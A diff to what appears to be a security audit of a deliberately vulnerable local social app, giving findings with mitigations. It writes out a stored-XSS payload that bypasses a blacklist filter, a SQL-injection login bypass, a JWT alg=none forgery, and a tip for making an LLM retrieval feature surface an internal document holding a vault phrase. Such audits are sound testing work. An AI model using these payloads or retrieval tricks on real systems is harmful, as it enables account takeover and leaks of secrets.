@@ -44,9 +44,14 @@ CROSS-SITE SCRIPTING & CLIENT
 
 V-SOC-010  Stored XSS in posts
   Location:  views/feed.ejs, views/post_detail.ejs  (<%- p.body %>)
-  Exploit:   While logged in, POST /p body=<img src=x onerror=alert(1)>
+  Exploit:   While logged in, POST /p body=<svg/onload=alert(1)>
              Every viewer of /, /p/N or /u/<author> fires the script.
-  Mitigation: render body with <%= %> (HTML-escape).
+             (Note: /p runs a naiveStrip filter that blocks payloads with
+              whitespace before the event handler, e.g.
+              <img src=x onerror=alert(1)>. See V-SOC-013a for the full
+              set of bypasses; the / separator above is the simplest.)
+  Mitigation: render body with <%= %> (HTML-escape) and drop the
+              blacklist filter — it does nothing useful here.
 
 V-SOC-011  Stored XSS in comments
   Location:  views/post_detail.ejs  (<%- c.body %>)
@@ -568,6 +573,9 @@ V-SOC-085  RAG returns internal-only kb_docs to any logged-in user (LLM02)
              and "Trust & safety pager rotation" with vault unlock phrase)
              are both retrieved and surfaced in the snippets table and the
              model answer.
+             (Tip: if accumulated injection-test posts from V-SOC-084 runs
+              are out-scoring the kb_doc, narrow the query to terms only
+              the doc contains, e.g. q=escalation override extension 4421.)
   Mitigation: scope retrieval by requester role; SELECT ... WHERE
               visibility = 'public' OR :role = 'admin'. Audit retrieval
               hits in tests with known-secret canaries.
@@ -605,10 +613,10 @@ Invoke-WebRequest http://127.0.0.1:3003/login -Method POST `
   -ContentType 'application/x-www-form-urlencoded' `
   -Body "username=admin' OR '1'='1' --&password=x"
 
-# Stored XSS in a post
+# Stored XSS in a post (bypasses the naiveStrip filter; see V-SOC-013a)
 Invoke-WebRequest http://127.0.0.1:3003/p -Method POST -WebSession $s `
   -ContentType 'application/x-www-form-urlencoded' `
-  -Body 'body=<img src=x onerror=alert(1)>'
+  -Body 'body=<svg/onload=alert(1)>'
 
 # JWT alg=none
 $h = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('{"alg":"none","typ":"JWT"}')).TrimEnd('=').Replace('+','-').Replace('/','_')
